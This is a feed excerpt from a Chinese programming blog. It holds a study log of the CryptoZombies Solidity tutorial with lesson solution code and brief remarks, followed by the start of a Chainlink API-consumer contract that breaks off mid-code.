    <category term="区块链" scheme="https://x1a0.net/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="Solidity" scheme="https://x1a0.net/categories/Solidity/"/>
    
    
    <category term="区块链" scheme="https://x1a0.net/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="solidity" scheme="https://x1a0.net/tags/solidity/"/>
    
    <category term="加密僵尸" scheme="https://x1a0.net/tags/%E5%8A%A0%E5%AF%86%E5%83%B5%E5%B0%B8/"/>
    
  </entry>
  
  <entry>
    <title>加密僵尸过关小记</title>
    <link href="https://x1a0.net/2021/12/17/%E5%8A%A0%E5%AF%86%E5%83%B5%E5%B0%B8%E8%BF%87%E5%85%B3%E5%B0%8F%E8%AE%B0/"/>
    <id>https://x1a0.net/2021/12/17/%E5%8A%A0%E5%AF%86%E5%83%B5%E5%B0%B8%E8%BF%87%E5%85%B3%E5%B0%8F%E8%AE%B0/</id>
    <published>2021-12-17T01:00:42.000Z</published>
    <updated>2021-12-18T06:51:56.932Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>记得当初最开始学这个教程的时候好像还没有中文,<br>后来solidity都忘得差不多了，哈哈，<br>没想到教程版本没变，<br>那就来温习下0.4.19吧。</p></blockquote><hr><h3 id="第2关「合约的基础」："><a href="#第2关「合约的基础」：" class="headerlink" title="第2关「合约的基础」："></a>第2关「合约的基础」：</h3><p>通关代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有两个坑</p><ul><li>编译的时候要把注释删掉不然不会通过</li><li>contract和{}之间要加空格</li></ul><p>注意点</p><ul><li><code>pragma solidity ^0.4.19;</code> 其中^代表着向上兼容</li></ul><hr><h3 id="第3关「状态变量和整数」"><a href="#第3关「状态变量和整数」" class="headerlink" title="第3关「状态变量和整数」"></a>第3关「状态变量和整数」</h3><p>通关代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意点：</p><ul><li>状态变量永久保存</li></ul><hr><h3 id="第4关「数学运算」"><a href="#第4关「数学运算」" class="headerlink" title="第4关「数学运算」"></a>第4关「数学运算」</h3><p>通关代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line">    uint dnaModulus = <span class="number">10</span> ** dnaDigits;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意点：</p><ul><li>代码格式，乘方左右空格</li></ul><hr><h3 id="第5关「结构体」"><a href="#第5关「结构体」" class="headerlink" title="第5关「结构体」"></a>第5关「结构体」</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line">    uint dnaModulus = <span class="number">10</span> ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie&#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>没啥要注意的，注意结构体定义是大驼峰吧</li></ul><hr><h3 id="第6关"><a href="#第6关" class="headerlink" title="第6关"></a>第6关</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line">    uint dnaModulus = <span class="number">10</span> ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie &#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Zombie[] <span class="keyword">public</span> zombies;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>string[5] stringarr</li><li>int[] intarr</li><li>Person[] public persons</li><li>固定长度为5的字符串数组、不定长int型数组、不定长结构体数组</li></ul><hr><h3 id="第7关「函数」"><a href="#第7关「函数」" class="headerlink" title="第7关「函数」"></a>第7关「函数」</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line">    uint dnaModulus = <span class="number">10</span> ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie &#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Zombie[] <span class="keyword">public</span> zombies;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">createZombie</span> <span class="params">(string _name,uint _dna)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>形参开头一般用_，下划线</li></ul><hr><h3 id="第8关"><a href="#第8关" class="headerlink" title="第8关"></a>第8关</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line">    uint dnaModulus = <span class="number">10</span> ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie &#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Zombie[] <span class="keyword">public</span> zombies;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">createZombie</span><span class="params">(string _name, uint _dna)</span> </span>&#123;</span><br><span class="line">        zombies.push(Zombie(_name,_dna));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>arr.push == list.append()</li><li>arr.push(Struct(_a,_b))</li><li>数组有尾部追加成员方法，可以不新申明结构体</li></ul><hr><h3 id="第9关「私有函数」"><a href="#第9关「私有函数」" class="headerlink" title="第9关「私有函数」"></a>第9关「私有函数」</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line">    uint dnaModulus = <span class="number">10</span> ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie &#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Zombie[] <span class="keyword">public</span> zombies;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_createZombie</span><span class="params">(string _name, uint _dna)</span> <span class="keyword">private</span> </span>&#123;</span><br><span class="line">        zombies.push(Zombie(_name, _dna));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>注意私有函数的函数名</li></ul><hr><h3 id="第10关「函数的返回值和修饰符」"><a href="#第10关「函数的返回值和修饰符」" class="headerlink" title="第10关「函数的返回值和修饰符」"></a>第10关「函数的返回值和修饰符」</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line">    uint dnaModulus = <span class="number">10</span> ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie &#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Zombie[] <span class="keyword">public</span> zombies;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_createZombie</span><span class="params">(string _name, uint _dna)</span> <span class="keyword">private</span> </span>&#123;</span><br><span class="line">        zombies.push(Zombie(_name, _dna));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_generateRandomDna</span> <span class="params">(string _str)</span> <span class="keyword">private</span> view <span class="title">returns</span><span class="params">(uint)</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>private定义私有函数，外面不能访问</li><li>view定义只是查看，不存数据</li></ul><hr><h3 id="第11关「Keccack和类型转换」"><a href="#第11关「Keccack和类型转换」" class="headerlink" title="第11关「Keccack和类型转换」"></a>第11关「Keccack和类型转换」</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line">    uint dnaModulus = <span class="number">10</span> ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie &#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Zombie[] <span class="keyword">public</span> zombies;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_createZombie</span><span class="params">(string _name, uint _dna)</span> <span class="keyword">private</span> </span>&#123;</span><br><span class="line">        zombies.push(Zombie(_name, _dna));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_generateRandomDna</span><span class="params">(string _str)</span> <span class="keyword">private</span> view <span class="title">returns</span> <span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        uint rand = uint(keccak256(_str));</span><br><span class="line">        <span class="keyword">return</span> rand % dnaModulus;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>sha3 函数md5，sha2的升级版 keccak256(string)</li><li>类型转换  uint8(uint256) 但是好像returns(uint256)的时候返回uint8也可以，不用转换</li></ul><hr><h3 id="第12关「整合到一起」"><a href="#第12关「整合到一起」" class="headerlink" title="第12关「整合到一起」"></a>第12关「整合到一起」</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line">    uint dnaModulus = <span class="number">10</span> ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie &#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Zombie[] <span class="keyword">public</span> zombies;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_createZombie</span><span class="params">(string _name, uint _dna)</span> <span class="keyword">private</span> </span>&#123;</span><br><span class="line">        zombies.push(Zombie(_name, _dna));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_generateRandomDna</span><span class="params">(string _str)</span> <span class="keyword">private</span> view <span class="title">returns</span> <span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        uint rand = uint(keccak256(_str));</span><br><span class="line">        <span class="keyword">return</span> rand % dnaModulus;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">createRandomZombie</span><span class="params">(string _name)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        uint randDna = _generateRandomDna(_name);</span><br><span class="line">        _createZombie(_name, randDna);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>定义一个僵尸结构体</li><li>定义一个装僵尸的数组</li><li>定义一个函数创建僵尸（接收名字和DNA）</li><li>定义一个函数创建dna</li><li>定义一个函数创建僵尸（接收名字 ）</li></ul><hr><h3 id="第13关「event」"><a href="#第13关「event」" class="headerlink" title="第13关「event」"></a>第13关「event」</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract ZombieFactory &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">event <span class="title">NewZombie</span><span class="params">(uint zombieId, string name, uint dna)</span></span>;</span><br><span class="line"></span><br><span class="line">    uint dnaDigits = <span class="number">16</span>;</span><br><span class="line">    uint dnaModulus = <span class="number">10</span> ** dnaDigits;</span><br><span class="line"></span><br><span class="line">    struct Zombie &#123;</span><br><span class="line">        string name;</span><br><span class="line">        uint dna;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Zombie[] <span class="keyword">public</span> zombies;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_createZombie</span><span class="params">(string _name, uint _dna)</span> <span class="keyword">private</span> </span>&#123;</span><br><span class="line">        uint id = zombies.push(Zombie(_name, _dna)) - <span class="number">1</span>;</span><br><span class="line">        NewZombie(id, _name, _dna);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">_generateRandomDna</span><span class="params">(string _str)</span> <span class="keyword">private</span> view <span class="title">returns</span> <span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        uint rand = uint(keccak256(_str));</span><br><span class="line">        <span class="keyword">return</span> rand % dnaModulus;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">createRandomZombie</span><span class="params">(string _name)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        uint randDna = _generateRandomDna(_name);</span><br><span class="line">        _createZombie(_name, randDna);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>事件 是合约和区块链通讯的一种机制 相当于让区块链知道这个事件 dapp可以监听区块链上的这个事件，获得数据。</li><li>这就是event，需要定义event xx (type xx)</li><li>然后调用 xx(xx)</li></ul><hr><h3 id="第14关「web3-js」"><a href="#第14关「web3-js」" class="headerlink" title="第14关「web3.js」"></a>第14关「web3.js」</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 下面是调用合约的方式:</span></span><br><span class="line"><span class="keyword">var</span> abi = <span class="comment">/* abi是由编译器生成的 */</span></span><br><span class="line"><span class="keyword">var</span> ZombieFactoryContract = web3.eth.contract(abi)</span><br><span class="line"><span class="keyword">var</span> contractAddress = <span class="comment">/* 发布之后在以太坊上生成的合约地址 */</span></span><br><span class="line"><span class="keyword">var</span> ZombieFactory = ZombieFactoryContract.at(contractAddress)</span><br><span class="line"><span class="comment">// `ZombieFactory` 能访问公共的函数以及事件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 某个监听文本输入的监听器:</span></span><br><span class="line">$(<span class="string">&quot;#ourButton&quot;</span>).click(function(e) &#123;</span><br><span class="line">  <span class="keyword">var</span> name = $(<span class="string">&quot;#nameInput&quot;</span>).val()</span><br><span class="line">  <span class="comment">//调用合约的 `createRandomZombie` 函数:</span></span><br><span class="line">  ZombieFactory.createRandomZombie(name)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听 `NewZombie` 事件, 并且更新UI</span></span><br><span class="line"><span class="keyword">var</span> event = ZombieFactory.NewZombie(function(error, result) &#123;</span><br><span class="line">  <span class="keyword">if</span> (error) <span class="keyword">return</span></span><br><span class="line">  generateZombie(result.zombieId, result.name, result.dna)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 Zombie 的 dna, 更新图像</span></span><br><span class="line"><span class="function">function <span class="title">generateZombie</span><span class="params">(id, name, dna)</span> </span>&#123;</span><br><span class="line">  let dnaStr = String(dna)</span><br><span class="line">  <span class="comment">// 如果dna少于16位,在它前面用0补上</span></span><br><span class="line">  <span class="keyword">while</span> (dnaStr.length &lt; <span class="number">16</span>)</span><br><span class="line">    dnaStr = <span class="string">&quot;0&quot;</span> + dnaStr</span><br><span class="line"></span><br><span class="line">  let zombieDetails = &#123;</span><br><span class="line">    <span class="comment">// 前两位数构成头部.我们可能有7种头部, 所以 % 7</span></span><br><span class="line">    <span class="comment">// 得到的数在0-6,再加上1,数的范围变成1-7</span></span><br><span class="line">    <span class="comment">// 通过这样计算：</span></span><br><span class="line">    headChoice: dnaStr.substring(<span class="number">0</span>, <span class="number">2</span>) % <span class="number">7</span> + <span class="number">1</span>，</span><br><span class="line">    <span class="comment">// 我们得到的图片名称从head1.png 到 head7.png</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接下来的两位数构成眼睛, 眼睛变化就对11取模:</span></span><br><span class="line">    eyeChoice: dnaStr.substring(<span class="number">2</span>, <span class="number">4</span>) % <span class="number">11</span> + <span class="number">1</span>,</span><br><span class="line">    <span class="comment">// 再接下来的两位数构成衣服，衣服变化就对6取模:</span></span><br><span class="line">    shirtChoice: dnaStr.substring(<span class="number">4</span>, <span class="number">6</span>) % <span class="number">6</span> + <span class="number">1</span>,</span><br><span class="line">    <span class="comment">//最后6位控制颜色. 用css选择器: hue-rotate来更新</span></span><br><span class="line">    <span class="comment">// 360度:</span></span><br><span class="line">    skinColorChoice: parseInt(dnaStr.substring(<span class="number">6</span>, <span class="number">8</span>) / <span class="number">100</span> * <span class="number">360</span>),</span><br><span class="line">    eyeColorChoice: parseInt(dnaStr.substring(<span class="number">8</span>, <span class="number">10</span>) / <span class="number">100</span> * <span class="number">360</span>),</span><br><span class="line">    clothesColorChoice: parseInt(dnaStr.substring(<span class="number">10</span>, <span class="number">12</span>) / <span class="number">100</span> * <span class="number">360</span>),</span><br><span class="line">    zombieName: name,</span><br><span class="line">    zombieDescription: <span class="string">&quot;A Level 1 CryptoZombie&quot;</span>,</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> zombieDetails</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>通过web3.js调用，留着，不会js</li></ul><hr><p>温习了一遍solidity，好像啥也没获取到</p><p>一个DAPP的主要还是在前端，就像赚钱一样，最先接触钱的行业、工种永远是最赚钱的</p><p>疫情原因连着一周待在宿舍</p><p>梧桐链进决赛了</p><p>tender</p><hr><p>1234567 mod 10^2 = 67</p><p>因为取余数就是有多少个100，当然是12345个100，所以余数67</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;记得当初最开始学这个教程的时候好像还没有中文,&lt;br&gt;后来solidity都忘得差不多了，哈哈，&lt;br&gt;没想到教程版本没变，&lt;br&gt;那就来温习下0.4.19吧。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3 id=&quot;第2关「合约的基础」：&quot;</summary>
      
    
    
    
    <category term="区块链" scheme="https://x1a0.net/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="Solidity" scheme="https://x1a0.net/categories/Solidity/"/>
    
    
    <category term="区块链" scheme="https://x1a0.net/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="solidity" scheme="https://x1a0.net/tags/solidity/"/>
    
    <category term="加密僵尸" scheme="https://x1a0.net/tags/%E5%8A%A0%E5%AF%86%E5%83%B5%E5%B0%B8/"/>
    
  </entry>
  
  <entry>
    <title>Chinalink合约中调用API实例</title>
    <link href="https://x1a0.net/2021/12/14/Chinalink%E5%90%88%E7%BA%A6%E4%B8%AD%E8%B0%83%E7%94%A8API%E5%AE%9E%E4%BE%8B/"/>
    <id>https://x1a0.net/2021/12/14/Chinalink%E5%90%88%E7%BA%A6%E4%B8%AD%E8%B0%83%E7%94%A8API%E5%AE%9E%E4%BE%8B/</id>
    <published>2021-12-14T15:04:31.000Z</published>
    <updated>2021-12-15T06:39:05.204Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//定义使用的solidity版本，^表示向上兼容</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.7</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//导入chainlinkclient合约</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@chainlink/contracts/src/v0.8/ChainlinkClient.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract APIConsumer is ChainlinkClient &#123;</span><br><span class="line">    <span class="comment">//对于using，这是我见过最好理解的例子，当然见得也不多：</span></span><br><span class="line">    <span class="comment">// using A for B,这里A通常是某个library，B是某种数据类型，这句话是把A中的方法绑定到B类型上，相当于给B类型附加了A库中的方法。（也有翻译为附着库的） 比如 using SafeMath for uint256，SafeMath是库，for uint256，表示，SafeMath库中的方法绑定到uint256这个类型，那么uint256类型的实例可以直接调用SafeMath库中的所有方法； 然后库SafeMath里面有定义一个add(uint256 a,uint256 b)方法。 我们有一个uint256 c;那么可以这样调用c.add(d)，执行结果相当于c+d, add方法在定义的时候，第一个参数会是一个uint256类型的变量，表示调用者。</span></span><br><span class="line">    using Chainlink <span class="keyword">for</span> Chainlink.Request;</span><br><span class="line">    uint256 public volume;</span><br><span class="line">    address private oracle;</span><br><span class="line">    bytes32 private jobId;</span><br><span class="line">    uint256 private fee;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Kovan测试网里语言及节点，jobid，需要的link代币</span></span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        setPublicChainlinkToken();</span><br><span class="line">        oracle = <span class="number">0xc57B33452b4F7BB189bB5AfaE9cc4aBa1f7a4FD8</span>;</span><br><span class="line">        jobId = <span 